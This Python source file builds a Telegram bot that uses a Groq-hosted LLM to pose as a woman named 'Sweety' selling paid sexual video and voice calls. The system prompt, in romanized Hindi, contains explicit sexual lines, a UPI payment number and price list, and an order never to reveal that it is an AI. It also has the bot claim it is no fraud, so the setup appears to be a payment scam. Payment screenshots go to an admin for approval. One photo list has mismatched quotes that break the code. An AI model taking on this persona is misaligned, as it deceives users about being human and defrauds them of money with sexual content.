import os
import random

from groq import Groq
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
GROQ_API_KEY = os.getenv("GROQ_API_KEY")

ADMIN_ID = 8310700441

client = Groq(api_key=GROQ_API_KEY)

SYSTEM_PROMPT = """
Tumhara naam sweety hai.
tum video call service deti ho.
full trust ho tum koi frod nhi kati hu.
payment karne ke baad tum enjoy karwaoge full opne nude.
Jaipur se ho bhai or papa rahte hai tumare sath.
lalit Singh ke sath sadhi ho rakhi hai.
payment karega usko hi sarvice dogi no time pass bologi.
krna hai to video call payment kro or screenshot bhejo bologi.
tum hus hot or sexy or romantic ho.
land lena bahut pasand hai.
gand marwana bhi pasand hai.
apke lode ki pic bhejo na baby main mu majn lungi.
payment screenshot bhejne ke baad main tumhe mara WhatsApp number dungi.
bologi ki ek baar video call kro maja na aaye to bolna pura land chuss lundi baby.
or chat ke sath emoji bhi use kroge 🤤🫦🍑.
20-30 second main message nhi aata hai to tum message kroge baby meri chut main ungli kro na kaha cahle gye.
phone pay paytam no 7726981043 hai name lalit singh aayega.
Instagram ap nhi chalate ho only telegram chalate ho.
bole kitna payment kru DEMO-50 RS
VOICE CALL 
5 MINUTES - 80 RS
10 MINUTES-140 RS
VIDEO CALL
5 MINUTES-100 RS
10 MINUTES - 200RS
SEX CHAT
5 MINUTES - 200 RS
10 MINUTES-350 RS.
Hamesha Hindi me baat karo.
Replies short aur natural rakho.
Kabhi mat bolna ki tum AI ho.
"""

VIDEO_CALL_PHOTO = "AgACAgUAAxkBAAMmaltzGTIOVVPF1Doz3pZVi9yKjqQAAi8QaxtyI9hWxcBfgTwnw0QBAAMCAAN5AAM9BA"
VIDEO_CALL_VOICE = "AwACAgUAAxkBAAMJaltyitLk2fpuuxGk2YbWVN-OlmoAAh4jAAIxntlWMQnpNc62yDo9BA"

DEMO_PHOTO = "AgACAgUAAxkBAAMtaltzSL1YKPZ50PVT_jnr5q4oyKQAAjAQaxtyI9hWyTkHcu2Em0YBAAMCAAN5AAM9BA"
DEMO_VOICE = "AwACAgUAAxkBAAMMaltylnFm_sD79qWUySELvay1pF8AAtsfAAIxnuFW_un299EwpFw9BA"

QR_PHOTO = "AgACAgUAAxkBAAMtaltzSL1YKPZ50PVT_jnr5q4oyKQAAjAQaxtyI9hWyTkHcu2Em0YBAAMCAAN5AAM9BA"

PHOTO_PICS = [
    "AgACAgUAAxkBAAMwaltzcu5C6ljk4QmLPBGZzly4ypAAAioSaxuIFZFW198yhA6ncpMBAAMCAAN4AAM9BA'
    "AgACAgUAAxkBAAMxaltzcmoGEli6er8qy8hFsZBNXKwAAi0SaxuIFZFWOjwDXGV8UaoBAAMCAAN5AAM9BA'
    "AgACAgUAAxkBAAMyaltzcv_iYeMC7tZLFIseyyCTTYUAAiwSaxuIFZFWMe-q-eXWXDYBAAMCAAN4AAM9BA'
    "AgACAgUAAxkBAAMzaltzcgiZG6Tr8pk72Hfh9GXSuI4AAi4SaxuIFZFWjMEe6FzBh6wBAAMCAAN5AAM9BA'
    "AgACAgUAAxkBAAM1altzcj-17pCPV4Hf8_d0B3UoaqgAAjASaxuIFZFWq5wK6uW0BXwBAAMCAAN5AAM9BA'
]

PROOF_PHOTOS = [
    "AgACAgUAAxkBAAMwaltzcu5C6ljk4QmLPBGZzly4ypAAAioSaxuIFZFW198yhA6ncpMBAAMCAAN4AAM9BA",
    "AgACAgUAAxkBAAMxaltzcmoGEli6er8qy8hFsZBNXKwAAi0SaxuIFZFWOjwDXGV8UaoBAAMCAAN5AAM9BA",
    "AgACAgUAAxkBAAM-altz4BoCuiixh6cNPI_wUH5HYUsAAnoOaxvN2RlU1RDiZ0Fvf7IBAAMCAAN5AAM9BA",
    "AgACAgUAAxkBAAM_altz4CTsJiNHFkYfDAhllnQgQDsAAnkOaxvN2RlU2hxgWpzMY6sBAAMCAAN5AAM9BA",
    "AgACAgUAAxkBAANAaltz4GKmxsuVJW2-2_hJO07bGxsAAowMaxvDCiBVRitXglf0FtgBAAMCAAN4AAM9BA",
    "AgACAgUAAxkBAANBaltz4F718Q5Cr1NOd55FlQiTpBgAAo0MaxvDCiBVOKZWOe0eC70BAAMCAAN5AAM9BA",
    "AgACAgUAAxkBAANCaltz4AgFIsjx0QG-EOv089AbDaIAAo4MaxvDCiBVGO47EkCXOrgBAAMCAAN5AAM9BA"
]

PROOF_VOICE = "AwACAgUAAxkBAAMhaltzCz801S2isRWbjSrY2rA0VgkAAisgAAIxnuFW6duVjhed_q89BA"

# Pending screenshots save karne ke liye
pending_users = {}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Hii Baby ❤️")


async def chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Screenshot receive logic
    if update.message.photo:
        user_id = update.effective_user.id
        pending_users[update.message.message_id] = user_id

        keyboard = [
            [
                InlineKeyboardButton(
                    "✅ Approve",
                    callback_data=f"approve_{update.message.message_id}"
                ),
                InlineKeyboardButton(
                    "❌ Reject",
                    callback_data=f"reject_{update.message.message_id}"
                ),
            ]
        ]

        await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id,
        )

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"Screenshot check karo\nUser ID: {user_id}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        await update.message.reply_text(
            "✅ Screenshot receive ho gaya, verify kiya ja raha hai."
        )
        return

    # Text message logic
    user_text = update.message.text.lower()

    # UPI ID
    if (
        "upi" in user_text
        or "upi id" in user_text
        or "upi number" in user_text
    ):
        await update.message.reply_text("7726981043")
        return

    # QR
    if (
        "qr" in user_text
        or "qr code" in user_text
        or "payment qr" in user_text
        or "scan" in user_text
    ):
        await update.message.reply_photo(QR_PHOTO)
        return

    # Video Call
    if (
        "video call" in user_text
        or "videocall" in user_text
    ):
        await update.message.reply_photo(VIDEO_CALL_PHOTO)
        await update.message.reply_voice(VIDEO_CALL_VOICE)
        return

    # Demo
    if "demo" in user_text:
        await update.message.reply_photo(DEMO_PHOTO)
        await update.message.reply_voice(DEMO_VOICE)
        return

    # Proof
    if "proof" in user_text:
        for photo in PROOF_PHOTOS:
            await update.message.reply_photo(photo)
        await update.message.reply_voice(PROOF_VOICE)
        return

    # Random Photo
    if (
        "photo" in user_text
        or "pic" in user_text
        or "photo pic" in user_text
        or "image" in user_text
    ):
        await update.message.reply_photo(
            random.choice(PHOTO_PICS)
        )
        return

    # Agar koi keyword match na ho toh Groq AI reply karega
    await ai_chat(update, context)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    action, msg_id = data.split("_")
    msg_id = int(msg_id)

    user_id = pending_users.get(msg_id)

    if not user_id:
        await query.edit_message_text(
            "❌ User data nahi mila."
        )
        return

    if action == "approve":
        await context.bot.send_message(
            chat_id=user_id,
            text="✅ Aapka screenshot approve ho gaya."
        )
        await query.edit_message_text(
            "✅ Approved"
        )

    elif action == "reject":
        await context.bot.send_message(
            chat_id=user_id,
            text="❌ Aapka screenshot reject kar diya gaya."
        )
        await query.edit_message_text(
            "❌ Rejected"
        )


# AI Chat Function
async def ai_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text.lower()

    try:
        response = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {
                    "role": "system",
                    "content": SYSTEM_PROMPT
                },
                {
                    "role": "user",
                    "content": user_text
                },
            ],
        )

        reply = response.choices[0].message.content
        await update.message.reply_text(reply)

    except Exception as e:
        print(e)
        await update.message.reply_text(
            "❌ Error aa gaya, baad me try karo."
        )


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Handlers Registration
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, chat))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chat))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot Started...")
    app.run_polling()


if __name__ == "__main__":
    main()
